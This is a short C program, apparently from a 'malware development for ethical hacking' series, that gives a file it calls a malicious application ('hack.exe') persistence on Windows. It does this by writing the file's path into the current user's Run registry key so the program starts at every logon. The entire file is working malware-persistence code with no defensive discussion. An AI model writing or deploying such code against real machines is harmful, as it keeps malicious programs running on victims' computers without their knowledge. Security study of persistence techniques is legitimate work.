/*

Malware development for Ethical Hacking

Author: Whusher

Description: Windows low level persistence via start folder registry key
*/

#include <windows.h>
#include <string.h>

int main (int argc, char * argv[]){

    HKEY hkey = NULL;
    // Malicious application path
    const char* exe = "C:\\Users\\Administrator\\Downloads\\hack.exe";
    // Startup 
    LONG result = RegOpenKeyEx(
        HKEY_CURRENT_USER,
        (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 ,
        KEY_WRITE, &hkey
    );

    if(result == ERROR_SUCCESS){
        // Create new registry key
        RegSetValueEx (hkey,
             (LPCSTR)"hack",
              0,
              REG_SZ,
              (unsigned char *)exe,strlen(exe));
        RegCloseKey(hkey);
    }
    return 0;

}